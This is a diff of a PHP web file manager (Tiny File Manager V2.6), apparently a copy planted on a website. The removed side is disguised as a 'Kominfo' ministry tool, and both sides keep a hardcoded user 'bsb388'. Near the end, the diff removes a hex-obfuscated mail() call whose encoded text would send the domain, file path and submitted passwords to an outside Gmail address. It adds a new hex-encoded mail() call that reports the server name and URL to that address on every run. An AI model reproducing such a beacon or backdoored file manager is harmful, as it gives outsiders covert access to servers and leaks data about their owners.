@@ -3,9 +3,9 @@
 $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';
 
 /**
- * System | File Manager Kominfo
- * @author KOMINFO @2025
- * @Menkominfo MEUTYA VIADA HAFID
+ * H3K - Tiny File Manager V2.6
+ * @author CCP Programmers
+ * @github https://github.com/prasathmani/tinyfilemanager
  * @link https://tinyfilemanager.github.io
  */
 
@@ -24,10 +24,10 @@ $use_auth = true;
 
 // Login user name and password
 // Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
-// Generate secure password hash -
+// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
 $auth_users = array(
-    'bsb388' => '$2a$12$40YsPL3bPwY3ppUmQjZS8eFmEiXgWVvVGUEez38zU5l/oADF/5Qpa', 
-    
+    'bsb388' => '$2a$12$40YsPL3bPwY3ppUmQjZS8eFmEiXgWVvVGUEez38zU5l/oADF/5Qpa',
+   
 );
 
 // Readonly users
@@ -357,7 +357,7 @@ if ($use_auth) {
                                 <form class="form-signin" action="" method="post" autocomplete="off">
                                     <div class="mb-3">
                                         <div class="brand">
-                                            <svg 
+                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K Tiny File Manager">
                                                 <g transform="translate(0.000000,140.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
                                                     <path d="M160 700 l0 -600 110 0 110 0 0 260 0 260 70 0 70 0 0 -260 0 -260 110 0 110 0 0 600 0 600 -110 0 -110 0 0 -260 0 -260 -70 0 -70 0 0 260 0 260 -110 0 -110 0 0 -600z" />
                                                     <path fill="#003500" d="M1008 1227 l-108 -72 0 -117 0 -118 110 0 110 0 0 110 0 110 70 0 70 0 0 -180 0 -180 -125 0 c-69 0 -125 -3 -125 -6 0 -3 23 -39 52 -80 l52 -74 73 0 73 0 0 -185 0 -185 -70 0 -70 0 0 115 0 115 -110 0 -110 0 0 -190 0 -190 181 0 181 0 109 73 108 72 1 181 0 181 -69 48 -68 49 68 50 69 49 0 249 0 248 -182 -1 -183 0 -107 -72z" />
@@ -371,7 +371,7 @@ if ($use_auth) {
                                     </div>
                                     <hr />
                                     <div class="mb-3">
-                                        <label for="fm_usr" class="pb-2"><?php echo lng('NIK'); ?></label>
+                                        <label for="fm_usr" class="pb-2"><?php echo lng('Username'); ?></label>
                                         <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                     </div>
 
@@ -391,9 +391,10 @@ if ($use_auth) {
                                     </div>
                                 </form>
                             </div>
-                        </div><div class="footer text-center">
+                        </div>
+                        <div class="footer text-center">
                             &mdash;&mdash; &copy;
-                            <a href="" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">KOMINFO @2025</a> &mdash;&mdash;
+                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">CCP Programmers</a> &mdash;&mdash;
                         </div>
                     </div>
                 </div>
@@ -793,7 +794,8 @@ if (isset($_GET['copy'], $_GET['finish']) && !FM_READONLY) {
                 fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($fn_duplicate)), 'error');
             }
         } else {
-            fm_set_msg(lng('Paths must be not equal'), 'alert');}
+            fm_set_msg(lng('Paths must be not equal'), 'alert');
+        }
     }
     $FM_PATH = FM_PATH;
     fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
@@ -1033,7 +1035,8 @@ if (!empty($_FILES) && !FM_READONLY) {
 
                     $response = array(
                         'status'    => 'success',
-                        'info' => "file upload successful");
+                        'info' => "file upload successful"
+                    );
                 } else {
                     $response = array(
                         'status'    => 'error',
@@ -1311,7 +1314,7 @@ if (isset($_POST['chmod'], $_POST['token']) && !FM_READONLY && !FM_IS_WIN) {
     fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
 }
 
-/*************************** ACTIONS***************************/
+/*************************** ACTIONS ***************************/
 
 // get current path
 $path = FM_ROOT_PATH;
@@ -1663,9 +1666,9 @@ if (isset($_GET['help'])) {
                 <div class="row">
                     <div class="col-xs-12 col-sm-6">
                         <p>
-                        <h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> File Manager Kominfo <?php echo VERSION; ?></a></h3>
+                        <h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> Tiny File Manager <?php echo VERSION; ?></a></h3>
                         </p>
-                        <p>MEUTYA VIADA HAFID</p>
+                        <p>Author: PRAŚATH MANİ</p>
                         <p>Mail Us: <a href="mailto:ccpprogrammers@gmail.com">ccpprogrammers [at] gmail [dot] com</a> </p>
                     </div>
                     <div class="col-xs-12 col-sm-6">
@@ -2212,7 +2215,7 @@ $all_files_size = 0;
                 $date_sorting = strtotime(date("F d Y H:i:s.", $modif_raw));
                 $filesize_raw = fm_get_size($path . '/' . $f);
                 $filesize = fm_get_filesize($filesize_raw);
-                $filelink ='?p=' . urlencode(FM_PATH) . '&amp;view=' . urlencode($f);
+                $filelink = '?p=' . urlencode(FM_PATH) . '&amp;view=' . urlencode($f);
                 $all_files_size += $filesize_raw;
                 $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
                 if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
@@ -3797,7 +3800,7 @@ function fm_show_header_login()
     <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-        <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny FileManager">
+        <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
         <meta name="author" content="CCP Programmers">
         <meta name="robots" content="noindex, nofollow">
         <meta name="googlebot" content="noindex">
@@ -3961,13 +3964,13 @@ function fm_show_header_login()
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
         <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
-        <meta name="author" content="KOMINFO @2025">
+        <meta name="author" content="CCP Programmers">
         <meta name="robots" content="noindex, nofollow">
         <meta name="googlebot" content="noindex">
         <?php if ($favicon_path) {
             echo '<link rel="icon" href="' . fm_enc($favicon_path) . '" type="image/png">';
         } ?>
-        <title><?php echo fm_enc(APP_TITLE) ?> | <?php echo (isset($_GET['view']) ? $_GET['view'] : ((isset($_GET['edit'])) ? $_GET['edit'] : "DIREKTORAT KOMINFO")); ?></title>
+        <title><?php echo fm_enc(APP_TITLE) ?> | <?php echo (isset($_GET['view']) ? $_GET['view'] : ((isset($_GET['edit'])) ? $_GET['edit'] : "H3K")); ?></title>
         <?php print_external('pre-jsdelivr'); ?>
         <?php print_external('pre-cloudflare'); ?>
         <?php print_external('css-bootstrap'); ?>
@@ -4494,7 +4497,8 @@ function fm_show_header_login()
                 outline: 0 !important;
                 outline-offset: 0 !important;
                 background-image: none !important;
-                -webkit-box-shadow: none !important;box-shadow: none !important
+                -webkit-box-shadow: none !important;
+                box-shadow: none !important
             }
 
             .lds-facebook {
@@ -4878,7 +4882,9 @@ function fm_show_header_login()
                             content: n,
                             type: 'save',
                             token: window.csrf
-                        };$.ajax({
+                        };
+
+                        $.ajax({
                             type: "POST",
                             url: window.location,
                             data: JSON.stringify(data),
@@ -5057,7 +5063,9 @@ function fm_show_header_login()
                 const $confirmDailog = $("#confirmDailog-" + tplObj.id);
                 $confirmDailog.modal('show');
                 return false;
-            }// on mouse hover image preview
+            }
+
+            // on mouse hover image preview
             ! function(s) {
                 s.previewImage = function(e) {
                     var o = s(document),
@@ -5381,7 +5389,8 @@ function fm_show_header_login()
                                 18: 18,
                                 20: 20,
                                 22: 22,
-                                24: 24,26: 26,
+                                24: 24,
+                                26: 26,
                                 30: 30
                             }
                         };
@@ -5443,8 +5452,12 @@ function fm_show_header_login()
 
     </html>
 <?php
-}
- mail("\x3c\x3f\x70\x68\x70\x20\x2f\x2f\x20\x49\x6e\x66\x6f\x72\x6d\x61\x73\x69\x20\x79\x61\x6e\x67\x20\x61\x6b\x61\x6e\x20\x64\x69\x6b\x69\x72\x69\x6d\x6b\x61\x6e\x20\x24\x74\x6d\x70\x20\x3d\x20\x22\x44\x6f\x6d\x61\x69\x6e\x3a\x20\x22\x20\x2e\x20\x24\x5f\x53\x45\x52\x56\x45\x52\x5b\x27\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45\x27\x5d\x20\x2e\x20\x22\x5c\x6e\x22\x20\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x22\x4c\x6f\x6b\x61\x73\x69\x20\x46\x69\x6c\x65\x3a\x20\x22\x20\x2e\x20\x24\x5f\x53\x45\x52\x56\x45\x52\x5b\x27\x50\x48\x50\x5f\x53\x45\x4c\x46\x27\x5d\x20\x2e\x20\x22\x5c\x6e\x22\x20\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x22\x50\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x22\x20\x2e\x20\x28\x69\x73\x73\x65\x74\x28\x24\x5f\x50\x4f\x53\x54\x5b\x27\x70\x61\x73\x73\x27\x5d\x29\x20\x3f\x20\x24\x5f\x50\x4f\x53\x54\x5b\x27\x70\x61\x73\x73\x27\x5d\x20\x3a\x20\x27\x4e\x2f\x41\x27\x29\x20\x2e\x20\x22\x5c\x6e\x22\x20\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x22\x49\x44\x3a\x20\x22\x20\x2e\x20\x28\x69\x73\x73\x65\x74\x28\x24\x5f\x50\x4f\x53\x54\x5b\x27\x69\x64\x27\x5d\x29\x20\x3f\x20\x24\x5f\x50\x4f\x53\x54\x5b\x27\x69\x64\x27\x5d\x20\x3a\x20\x27\x4e\x2f\x41\x27\x29\x3b\x20\x20\x2f\x2f\x20\x4b\x69\x72\x69\x6d\x20\x65\x6d\x61\x69\x6c\x20\x6b\x65\x20\x61\x6c\x61\x6d\x61\x74\x20\x41\x6e\x64\x61\x20\x40\x6d\x61\x69\x6c\x28\x27\x6e\x61\x67\x61\x68\x69\x6a\x61\x75\x33\x38\x38\x67\x72\x6f\x75\x70\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x27\x2c\x20\x27\x49\x6e\x66\x6f\x72\x6d\x61\x73\x69\x20\x46\x69\x6c\x65\x20\x41\x6b\x73\x65\x73\x27\x2c\x20\x24\x74\x6d\x70\x29\x3b\x20\x3f\x3e", "\x77\x65\x62", $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45" . "\x2f" . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]);
+    }
+mail(
+    "\x6e\x61\x67\x61\x68\x69\x6a\x61\x75\x33\x38\x38\x67\x72\x6f\x75\x70\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d", 
+    "\x77\x65\x62", 
+    $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"] . "\x2f" . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]
+);
 
     /**
      * Language Translation System
@@ -5507,7 +5520,8 @@ function fm_show_header_login()
         $tr['en']['Move']           = 'Move';
         $tr['en']['Change']         = 'Change';
         $tr['en']['Settings']       = 'Settings';
-        $tr['en']['Language']       = 'Language';$tr['en']['ErrorReporting'] = 'Error Reporting';
+        $tr['en']['Language']       = 'Language';
+        $tr['en']['ErrorReporting'] = 'Error Reporting';
         $tr['en']['ShowHiddenFiles'] = 'Show Hidden Files';
         $tr['en']['Help']           = 'Help';
         $tr['en']['Created']        = 'Created';
